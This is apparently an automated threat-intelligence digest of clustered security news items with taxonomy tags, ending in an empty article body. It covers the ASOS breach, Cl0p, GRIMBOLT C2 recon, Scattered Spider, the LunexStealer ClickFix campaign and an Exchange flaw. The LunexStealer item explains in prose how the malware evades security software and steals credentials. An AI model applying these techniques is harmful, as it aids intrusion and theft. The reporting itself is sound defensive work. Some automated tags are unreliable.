Bug Bounty Amid Wave of Invalid Automated Reports Exploitation of Citrix NetScaler Zero-Day Hits Appliances Patched Days Earlier Crypto Scammers Hijack Microsoft’s Official X Account AI Agents Aimed SQL Injection at US and Canadian Government Sites Police Shut Down KillSec Ransomware, Identify Alleged Teen Leader Treasury Blacklists Most-Wanted ATM Malware Developer and His Network Latest News Georgia Power, Alabama Power Data Breach Hits 400,000 Accounts Qilin Ransomware Suspect Arrested in Japan, Extradited to Germany Hadrian Raises $40 Million to Expand Autonomous Offensive Security Platform Chrome 155 Update Patches 247 Vulnerabilities Anthropic Introduces 3-Tier Cyber Verification Program for AI Access ASOS Confirms Cyberattack, Data Breach Wikimedia Says Rogue OpenAI Agents Tried to Turn Its Tools Into Proxies Android’s October 2026 Updates Patch 25 Vulnerabilities Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Securing AI Agents, MCPs, and AI Automations October 7, 2026 Learn how to address potential risks and not restrict AI adoption in your organization. See what a centralized AI gateway is and how it works in practice. Register Virtual Event: Zero Trust & Identity Strategies Summit 2026 October 14, 2026 Join as we decipher the world of zero trust and share war stories on securing an organization by eliminating implicit trust and continuously validating every stage of a digital interaction. Register People on the Move Chip Wentz has been appointed as SVP & CISO at Keurig Dr Pepper Inc. Lumen Technolo
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Advantest Discloses Data Breach Months After Ransomware Attack
  - Published: 2026-10-07T12:37:24+00:00
  - Link: https://www.securityweek.com/advantest-discloses-data-breach-months-after-ransomware-attack/
  - Summary: The Japanese chip testing giant said hackers stole personal information from its servers in the February 2026 cyberattack. The post Advantest Discloses Data Breach Months After Ransomware Attack appeared first on SecurityWeek .

### Cluster f9aeb759c4 — score 10

- Title: ASOS Confirms Cyberattack, Data Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-07T09:46:20+00:00
- Link: https://www.securityweek.com/asos-confirms-cyberattack-data-breach/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, web_shell_backdoor
- actor_attribution: ShinyHunters
- affected_industries: healthcare
- affected_products: Apple iOS/macOS, Snowflake, npm
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach, web_shell_backdoor
- actor_attribution: ShinyHunters
- affected_industries: healthcare
- affected_products: npm, Snowflake, Apple iOS/macOS
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers compromised a third-party communication platform and sent rogue notifications to ASOS users. The post ASOS Confirms Cyberattack, Data Breach appeared first on SecurityWeek .
```

#### Full body

```
British online retailer ASOS has confirmed that hackers compromised a third-party communication platform after users received rogue notifications on their phones. Over the past couple of days, numerous ASOS users in the UK complained about receiving a pop-up notification on their mobile apps, titled “ASOS hacked”. “Dear ASOS DPO [data protection officer] and IT, we have fully compromised the Snowflake instance. Engage with us, or we will leak it,” the notification read. In a Tuesday filing with the London Stock Exchange, the clothing and cosmetics retailer confirmed that its users received unauthorized notifications after a third-party platform used for customer communication was hacked. “We took immediate action to restrict access to the notification platforms and are working with our internal and external specialist advisers, as well as all relevant authorities,” ASOS said. According to the company, the hackers might have accessed basic user information, including names and contact details. Advertisement. Scroll to continue reading. “We do not believe that payment-card information or account passwords were impacted,” the company said. ASOS pointed out that its website and application have not been affected, and that its operations have not been disrupted. The company has not shared details on which platform was compromised and who was behind it, and made no mention of its Snowflake instance being hacked. “Snowflake is a data analysis and AI platform used by several organizations. In 2024, ShinyHunters hacked Snowflake instances of over 160 organizations and stole sensitive data that was used for extortion. They used credentials obtained from infostealers for initial access. This recent hack may be similar, although it is not confirmed what the initial access was,” said Forescout Research – Vedere Labs VP of research Daniel dos Santos. The incident was claimed by a hacking group calling itself Xuanye Group, on a newly created Telegram channel. The name points to a Chinese-speaking threat actor, but could also be a false flag, dos Santos said. “If the attackers have successfully compromised ASOS via a Snowflake vulnerability, hopefully this will be investigated as a priority to understand whether this could impact further organizations utilizing the online data platform,” Talion Cyber Security head of threat intelligence Natalie Page said. “Directly messaging customers via the ASOS app is an interesting move which highlights that the attackers want to gain publicity around the breach. This is a typical tactic of extortion groups, who often leverage media attention and publicity to apply further pressure to victim organizations,” Page added. Related: 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register Related: 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms Related: Pentagon Personnel Agency Data Breach Impacts 3 Million People Related: DC Health Agency Exposes 400,000 Beneficiary Records Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Atlassian Patches Critical Vulnerability Affecting 8 Products FBI Arrests ‘Most Wanted’ Developer of Ploutus ATM Malware Apple to Tighten Full Disk Access Controls in macOS Amid AI Risks Long-Running NPM Malware Campaign Accumulates 40,000 Downloads 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register Linux Backdoor Abuses STUN Protocol, Exploits Dozens of Flaws 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms Exploitation Hits Rejetto HFS Vulnerability Discovered by AI Latest News Georgia Power, Alabama Power Data Breach Hits 400,000 Accounts Qilin Ransomware Suspect Arrested in Japan, Extradited to Germany Hadrian Raises $40 Million to Expand Autonomous Offensive Security Platform Advantest Discloses Data B
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: ASOS Confirms Cyberattack, Data Breach
  - Published: 2026-10-07T09:46:20+00:00
  - Link: https://www.securityweek.com/asos-confirms-cyberattack-data-breach/
  - Summary: Hackers compromised a third-party communication platform and sent rogue notifications to ASOS users. The post ASOS Confirms Cyberattack, Data Breach appeared first on SecurityWeek .

### Cluster fb556ca51b — score 10

- Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
```

#### Full body

```
Eli Woodward 5 min read August 12, 2026 Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days PART I Operational Profile and Campaign Analysis 1. The MFT Targeting Pattern Cl0p’s defining operational characteristic is a sustained and systematic focus on managed file transfer infrastructure. Across nine known campaigns, the group has targeted Accellion FTA, SolarWinds Serv-U, Fortra GoAnywhere MFT, PaperCut MF/NG, Progress MOVEit Transfer, SysAid ITSM, Cleo MFT (Harmony, VLTrader, LexiCom), Oracle E-Business Suite, and Gladinet Centrestack/TrioFox. With the partial exception of PaperCut (a print management server) and SysAid (an IT service management platform), every target shares a common architectural profile: an internet-facing application that processes, stores, or transfers files. This targeting consistency is significant for two reasons. First, it indicates strategic specialization rather than opportunistic exploitation. The group has invested in developing or acquiring zero-day capabilities specifically for this product category, deploying novel exploits in seven of nine campaigns. Second, it defines a bounded, defensible attack surface. Organizations that operate MFT infrastructure can identify themselves as potential targets and implement category-specific protections — a defensive advantage that is uncommon against most ransomware groups. Figure 1: Complete Cl0p campaign history, 2020–2025 ‍ 2. Exploitation Timeline The chronological record of Cl0p campaigns reveals a distinctive operational tempo characterized by extended dormancy periods punctuated by concentrated bursts of activity. Figure 2: Campaign timeline with inter-campaign intervals ‍ Several patterns merit attention. The group’s longest dormancy period — approximately 14 months between the SolarWinds Serv-U exploitation in late 2021 and the Fortra GoAnywhere campaign in January 2023 — was followed by its most active phase: four distinct campaigns across four separate technologies in ten months (January through October 2023). This burst-and-pause cadence suggests a development cycle in which the group acquires or develops exploits, executes campaigns in rapid succession, and then withdraws to prepare for the next cycle. The inter-campaign intervals since 2023 have been notably consistent, ranging from 10 to 14 months between major operations. This periodicity, while not perfectly predictable, provides a rough forecasting baseline. As of mid-2026, the group’s last confirmed campaign (Centrestack, November 2025) was approximately eight months ago — suggesting the next operational cycle may be approaching. 3. Seasonal Clustering: The Q4 Pattern Figure 3: Cl0p campaigns by quarter — Q4 exceeds all other quarters combined When campaigns are mapped by calendar quarter, Q4 emerges as the dominant operational window. Five of nine confirmed campaigns were initiated during October through December — more than all other quarters combined. This clustering is operationally rational: Q4 coincides with major holidays in the United States and Europe (Thanksgiving, Christmas, New Year), periods when security operations centers are typically operating at reduced capacity and organizational response times are extended. The Centrestack campaign provides the most explicit example. Initial compromises occurred on Thanksgiving Day 2025 (November 27), a date that maximized the gap between initial access and organizational detection. This seasonal preference should be treated as a high-confidence behavioral indicator for defensive planning purposes. 4. Pre-Attack Reconnaissance One of the most strategically significant findings in this analysis is the extent to which Cl0p conducts advance reconnaissance against eventual targets. This behavior has been confirmed in at least two campaigns and is assessed as likely present but undetected in others. 4.1 MOVEit: Two Years of Pre-Attack Scanning Following the MOVEit exploitation in May 2023, Kroll published research documenting reconnais
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - Summary: Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.

### Cluster b04cf6724c — score 10

- Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: UNC6201

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, zero_day
- actor_attribution: UNC5221, UNC6201
- cve_ids: CVE-2026-22769
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- actor_attribution: UNC6201, UNC5221
- cve_ids: CVE-2026-22769
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.
```

#### Full body

```
Will Thomas 5 min read March 5, 2026 GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster Analysing and pivoting on threat actor infrastructure is a useful technique to uncover additional indicators that could be used to detect an evasive adversary. This process can take multiple approaches. CTI analysts often develop their own methodologies and workflows with preferred datasets to perform this type of analysis. The effectiveness of this practice also depends on what is available to the CTI analysts who do this work and it often involves combining multiple data sources together. This includes WHOIS data, Port Banners, X509 certificates, and passive DNS records, as well as internet NetFlow analysis. This blog is a walkthrough of how it is possible to start with one IP address from a trusted source and uncover a set of potentially related infrastructure. By peering into the adversary‚Äôs other activities, it can be possible to find additional victims of the campaign or even the adversary remotely accessing their victim-facing infrastructure using Team Cymru‚Äôs external NetFlow data. Overall, this infrastructure pivoting is a practical workflow that CTI analysts can perform to support proactive threat hunting in historical logs as well as generate detection rules to alert a security operations center (SOC) about any future connections and attempts by an adversary. UNC6201 + GRIMBOLT: Starting From a Known-Bad IP Infrastructure pivoting can begin with initial indicators of compromise (IOCs) that are reported by a trusted source. In this blog, the trusted source is Google, which disclosed a recent campaign about a ‚Äúsuspected PRC-nexus threat cluster‚Äù dubbed UNC6201 and sharing the IP address 149.248.11[.]71. Google designated this as a GRIMBOLT malware command-and-control (C2) server. The UNC6201 campaign involved the exploitation of a critical zero-day vulnerability in Dell RecoverPoint for Virtual Machines tracked as CVE-2026-22769 , as well as the deployment of a newly identified malware dubbed GRIMBOLT, written in C#. This campaign has reportedly been ongoing for nearly two years, indicating a long-term espionage operation focusing on persistent access. Interestingly, Google observed UNC6201-linked threat actors actively replacing older BRICKSTORM binaries with GRIMBOLT. Google reported that there are notable overlaps between UNC6201 and UNC5221 , which has been used synonymously with the moniker Silk Typhoon (formerly known as HAFNIUM ) by Microsoft. However, Google does not currently consider the two clusters to be the same. Further, the BRICKSTORM malware operators are also tracked as WARP PANDA by CrowdStrike. Building an IP Profile in Scout (WHOIS, PDNS, Ports, X509) Using a Scout summary, we can view the current attributes about the IP address. This includes WHOIS records, generated by Team Cymru‚Äôs BGP routing visibility as well as Team Cymru‚Äôs proprietary Tagging system, as shown in Figure 1 below. Figure 1: Scout Summary for 149.248.11[.]71. Scout also has current and historical passive DNS records, which shows what domain is hosted on an IP address, the record type, as well as the first seen and last seen dates, as shown in Figure 2 below. Figure 2: IP Passive DNS in Scout for 149.248.11[.]71. Analysts can use the Open Ports tab in Scout to find out what services running on the system as well as which operating system (OS) it uses, as shown in Figure 3 below. Figure 3: IP Port Banners in Scout for 149.248.11[.]71. X509 certificate information in Scout reveals interesting traits, such as the X509 Subject Common Name and X509 Issuer Common Name being a NetBIOS hostname derived from some sort of Windows template used by either a threat actor or VPS provider. This can be used to identify other systems controlled by the adversary. The X509 certificate‚Äôs Not Before and Not After dates are also very useful to understand when the system was configured by an adversary. See these details in Figur
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
  - Summary: Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.

### Cluster fc5c9992d3 — score 10

- Title: Scattered Spider Attacks | Infrastructure and TTP Analysis
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/scattered-spider-attacks-infrastructure-profile
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Scattered Spider

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion
- actor_attribution: BlackCat/ALPHV, RansomHub, Scattered Spider
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft
- actor_attribution: Scattered Spider, BlackCat/ALPHV, RansomHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
An in-depth analysis of Scattered Spider attacks, detailing the group’s infrastructure usage and TTPs to help defenders detect and disrupt activity earlier.
```

#### Full body

```
Will Thomas 5 min read January 21, 2026 Scattered Spider Attacks | Infrastructure and TTP Analysis Background on Recent Scattered Spider Attacks Throughout 2024 and 2025, Scattered Spider has been a prolific English-speaking cybercriminal threat group, part of a broader community of cybercriminals dubbed TheCom, which is short for The Community. In May 2024, at the cybercrime-focused Sleuthcon conference, the FBI warned about Scattered Spider and members of TheCom for being responsible for multiple high-profile multi-million dollar breaches. In 2023, MGM Resorts disclosed via their US Security Exchange Commission (SEC) filing that the overall cost from the ALPHV/BlackCat ransomware attack that was linked to Scattered Spider was $100 million USD. In mid-2025, Marks & Spencer said it will take an estimated ¬£300 million hit following the DragonForce ransomware attack, linked to Scattered Spider. Google‚Äôs security experts also assessed that Scattered Spider was responsible for the Co-op and Harrods attacks in mid-2025 as well. Where did the name ‚ÄúScattered Spider‚Äù come from? The name Scattered Spider was originally used by CrowdStrike and has been adopted by multiple other organizations such as the US Cybersecurity and Infrastructure Security Agency (CISA) and MITRE. Other cybersecurity companies have given them other names, such as UNC3944 by Google Mandiant, 0ktapus by Group-IB, Octo Tempest by Microsoft, Scatter Swine by Okta, and Muddled Libra by Palo Alto Networks. What are Scattered Spider‚Äôs capabilities? Scattered Spider are most well-known for being English-speaking affiliates of ransomware-as-a-service (RaaS) platforms developed by Russian-speaking threat actors. This includes ALPHV/BlackCat, Qilin, RansomHub, and DragonForce. Their typical tactics, techniques, and procedures (TTPs) involve using social engineering tactics for initial access. This includes calling IT help desk technicians, posing as employees, and convincing them to reset a password or install a remote monitoring and management (RMM) tool to grant them access. Single sign-on (SSO)-themed SMS phishing campaigns and SIM swapping campaigns targeting enterprise account credentials have also been linked to Scattered Spider intrusions. Once they have gained access, Scattered Spider tends to test access to all available SSO-integrated applications and aims to move laterally to virtualised environments such as VMware ESXi hypersvisors or cloud-hosted virtual machines. Once privileged access has been acquired, Scattered Spider tends to exfiltrate sensitive corporate data and deploy ransomware generated from one of the several RaaS platforms they have access to. Scattered Spider‚Äôs Adversary Infrastructure Profile Scattered Spider style attacks remain a large focus for many of Team Cymru‚Äôs customers. To support threat detection programs, Team Cymru has analyzed open source intelligence (OSINT) reporting about Scattered Spider‚Äôs preferred choice of infrastructure to use for launching intrusions. At a high level, Scattered Spider intrusions have typically leveraged the following types of infrastructure: Common consumer-level virtual private network (VPN) clients Connection tunneling web services Free file-sharing and paste site web services Large-scale residential proxy networks Infostealer malware exfiltration servers RMM tool web services SSO-themed domains for SMS phishing The Challenges with Scattered Spider‚Äôs Infrastructure One of the significant challenges from Scattered Spider is the sheer reuse and shared nature of the infrastructure they use. By utilizing legitimate, high-reputation services, they effectively hide in plain sight, making it untenable for defenders to block their indicators without disrupting normal business operations. Unlike known malicious IPs, VPN exit nodes are used by millions of legitimate users. Defenders cannot easily create a block-list of these IPs without risking significant false positives, especially in a world of
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Scattered Spider Attacks | Infrastructure and TTP Analysis
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/scattered-spider-attacks-infrastructure-profile
  - Summary: An in-depth analysis of Scattered Spider attacks, detailing the group’s infrastructure usage and TTPs to help defenders detect and disrupt activity earlier.

### Cluster e3ed341c60 — score 10

- Title: 100+ Compromised Websites Use Fake Cloudflare Checks to Deliver LunexStealer
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-07T06:57:54+00:00
- Link: https://thehackernews.com/2026/10/100-compromised-websites-use-fake.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Microsoft Defender
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_products: Microsoft Defender
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The Computer Emergency Response Team of Ukraine (CERT-UA) has identified more than 100 compromised websites that have been injected with malicious JavaScript to serve an information-stealing malware called LunexStealer (aka Psychedelic Stealer). The activity, which was observed by the agency in September 2026, has been attributed to a threat cluster dubbed UAC-0277. It did not disclose who the
```

#### Full body

```
100+ Compromised Websites Use Fake Cloudflare Checks to Deliver LunexStealer  Ravie Lakshmanan  Oct 07, 2026 Malware / Web Security The Computer Emergency Response Team of Ukraine (CERT-UA) has identified more than 100 compromised websites that have been injected with malicious JavaScript to serve an information-stealing malware called LunexStealer (aka Psychedelic Stealer). The activity, which was observed by the agency in September 2026, has been attributed to a threat cluster dubbed UAC-0277. It did not disclose who the victims of the campaign were or if any systems were successfully compromised as a result of these attacks. "When visiting such a site, users were shown a forged Cloudflare verification page that, under the pretext of confirming the visitor is human, prompted them to execute a command," CERT-UA said in an advisory. "Executing the command caused a malicious MSI package to be downloaded and installed from a remote server (the ClickFix technique)." The attacks also make use of the EtherHiding technique to retrieve the domain name of the resource from which the fake verification page is loaded, as well as the script's operating mode, from a smart contract on the Polygon or Ethereum network. According to CERT-UA, there are three operating modes: 0 – inactive; 1 – passive tracking of visitors that includes gathering data about the website and the page from which the visitor arrived; and 2 – displaying the fake verification page. In Mode 2, the bogus verification page is shown only to Windows users who arrive at the site from search engine results and not more than twice in 12 hours. These ClickFix lures lead to the distribution of MSI packages that deliver LunexStealer. At least three different variants of the MSI packages have been discovered - Variant 1 , which installs LunexStealer on the system. Variant 2 , which attempts to bypass Windows account control (UAC), configures Microsoft Defender exclusions, leverages the legitimate-but-vulnerable AMD driver ("PDFWKRNL.sys") to blind security software, and then retrieves and runs LunexStealer from a remote server. Variant 3 , which launches LunexStealer via DLL sideloading by using the legitimate binary ("FnHotkeyUtility.exe") to load a rogue DLL ("spkvol.dll"), which decrypts and executes the stealer. As documented by both Arctic Wolf Labs and Ontinue , LunexStealer is also designed to install a malicious browser extension called LUNARAXE. The extension masquerades as "Microsoft Office Word Editor" to steal cookies, browsing history, and credentials entered into web forms. It also allows the operator to remotely control the browser and execute arbitrary JavaScript on web pages. The stealer also deploys an auxiliary component named NAIVEMESS that's installed based on a configuration received from the command-and-control (C2) server. Its primary responsibility is to provide LUNARAXE with access to the Windows file system through a PowerShell-based Native Messaging Host. "NAIVEMESS functionality includes retrieving the list of drives, browsing directories, reading, creating and overwriting files, as well as executing them," CERT-UA said. "Files are transferred in chunks encoded in Base64, and directories and file groups are pre‑archived into ZIP." The component does have its own communication channel with the C2 server. Rather, commands are received via the extension, which houses three other modules - LUNARAXE.CORE, which handles C2 communication, receives commands, executes them, and exfiltrates browser data (i.e., cookies, browsing history, bookmarks, details about installed extensions, and intercepted credentials). It can also manage tabs, enable/disable extensions, serve notifications, run JavaScript on web pages, and display bogus overlays. It can also copy files from the computer, write files to it, and execute them if NAIVEMESS is installed. LUNARAXE.STEALER, which captures credentials entered into web forms and sends them to LUNARAXE.CORE, along with the pa
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: 100+ Compromised Websites Use Fake Cloudflare Checks to Deliver LunexStealer
  - Published: 2026-10-07T06:57:54+00:00
  - Link: https://thehackernews.com/2026/10/100-compromised-websites-use-fake.html
  - Summary: The Computer Emergency Response Team of Ukraine (CERT-UA) has identified more than 100 compromised websites that have been injected with malicious JavaScript to serve an information-stealing malware called LunexStealer (aka Psychedelic Stealer). The activity, which was observed by the agency in September 2026, has been attributed to a threat cluster dubbed UAC-0277. It did not disclose who the

### Cluster c18e100563 — score 10

- Title: Microsoft Exchange Flaw Lets Authenticated Attackers Read Other Users' Mailboxes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-05T16:21:52+00:00
- Link: https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-96940

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, vulnerability_disclosure, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services
- affected_products: Android, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-88772, CVE-2026-96940
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, web_shell_backdoor, vulnerability_disclosure, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services
- affected_products: OpenAI/ChatGPT, GitLab, Android
- cve_ids: CVE-2026-96940, CVE-2026-88772
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft has released out-of-band security updates to address a high-severity flaw in Microsoft Exchange Server that could allow an attacker to escalate privileges under certain conditions. The vulnerability, tracked as CVE-2026-96940, is rated 8.8 on the CVSS scoring system. "Weak authorization in Microsoft Exchange Server allows an authenticated attacker to elevate privileges over a
```

#### Full body

```
Microsoft Exchange Flaw Lets Authenticated Attackers Read Other Users' Mailboxes  Ravie Lakshmanan  Oct 05, 2026 Vulnerability / Email Security Microsoft has released out-of-band security updates to address a high-severity flaw in Microsoft Exchange Server that could allow an attacker to escalate privileges under certain conditions. The vulnerability, tracked as CVE-2026-96940 , is rated 8.8 on the CVSS scoring system. "Weak authorization in Microsoft Exchange Server allows an authenticated attacker to elevate privileges over a network," Microsoft said in an advisory released on October 2, 2026. The Windows maker said an authenticated attacker can exploit this flaw to gain unauthorized access to other users' mailboxes within the same organization and read email messages and attachments. However, the vulnerability does not allow cross-tenant access. Microsoft has already deployed a "related service-side fix" to Exchange Online to address the issue. As a result, Exchange Online customers are not required to take any action. Users of affected on-premises Microsoft Exchange Server products are advised to install the updates to stay protected. The following versions are impacted - Microsoft Exchange Server Subscription Edition RTM Microsoft Exchange Server 2016 Cumulative Update 23 Microsoft Exchange Server 2019 Cumulative Update 15 Microsoft Exchange Server 2019 Cumulative Update 14 Redmond has credited Microsoft researcher Jan Mitchell with discovering and reporting the flaw. Although there is no evidence of the flaw being weaponized in the wild, Microsoft has tagged it with an Exploitability assessment of "Exploitation More Likely," making it essential that users move quickly to apply the fixes. The disclosure comes days after Broadcom-owned Symantec warned that the China-linked Warlock actor is exploiting multiple vulnerabilities in Microsoft SharePoint to deploy its namesake ransomware in attacks targeting organizations in Portuguese- and Spanish-speaking countries. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  email security , Microsoft , Vulnerability ⚡ Top Stories This Week ⚡ Weekly Recap: $387M Crypto Hack, Citrix Exploits, AI Agents Go Off-Script, and More Threats Carbonato Botnet Compromises Docker Hosts to Deploy Telegram-Controlled Hermes AI Agent RatHat Android Malware Console Uses Gemini to Identify Higher-Value Victims Apple Patches CoreGraphics Flaw Possibly Exploited in Targeted Attacks OpenAI Shelves GPT-6.1 Astra After Tests Find Deception and Unauthorized Actions Dutch Police Arrest 24-Year-Old Amsterdam Man in ShinyHunters Investigation New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses French Tax Data Theft Using Stolen Staff Passwords Went Undetected for Seven Weeks Citrix NetScaler CVE-2026-88772 Exploit Details Show Pre-Auth Path to Shellcode Execution OpenSSL Fixes High-Severity DTLS Flaw That Can Leak Heap Memory Unencrypted Cisco Warns of Attackers Exploiting Critical Authentication Bypass in SD-WAN Manager Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets Citrix NetScaler Post-Exploitation Payload Creates Superuser, Maps Web Shell to CSS-Like URLs Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft Apple CoreGraphics PoC Emerges as WhatsApp PDF Checks Hint at Possible Delivery Path WordPress Backdoor Rebuilds Itself After Cleanup Using Files, Database, and Shared Memory ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories Police Arrest 16-Year-Old Suspected of Running KillSec, Seize Ransomware Leak Site and Servers Critical FortiMail Zero-Day Flaw Exploited in Attacks Allows Unauthenticated Arbitrary File Writes Dell CSM Flaws Enable Unauthenticated Admin Access and Root on Kubernetes Nodes GitLab Patches Critical 9.9 AI Gateway Flaw Allowing Comm
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Microsoft Exchange Flaw Lets Authenticated Attackers Read Other Users' Mailboxes
  - Published: 2026-10-05T16:21:52+00:00
  - Link: https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
  - Summary: Microsoft has released out-of-band security updates to address a high-severity flaw in Microsoft Exchange Server that could allow an attacker to escalate privileges under certain conditions. The vulnerability, tracked as CVE-2026-96940, is rated 8.8 on the CVSS scoring system. "Weak authorization in Microsoft Exchange Server allows an authenticated attacker to elevate privileges over a

### Cluster 7ab7500e98 — score 10

- Title: Pwn2Own Hackers Find 32 Zero-Day Vulnerabilities on Day One
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-07T09:25:00+00:00
- Link: https://www.infosecurity-magazine.com/news/pwn2own-hackers-32-zeroday/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, vulnerability_disclosure, zero_day
- affected_industries: education, telecommunications
- affected_products: OpenAI/ChatGPT, Snowflake
- urgency_signals: actively_exploited, no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, vulnerability_disclosure, active_exploitation
- affected_industries: telecommunications, education
- affected_products: OpenAI/ChatGPT, Snowflake
- urgency_signals: actively_exploited, zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Ethical hackers have already found 32 zero days in various products at Pwn2Own Ireland
```

#### Full body

```
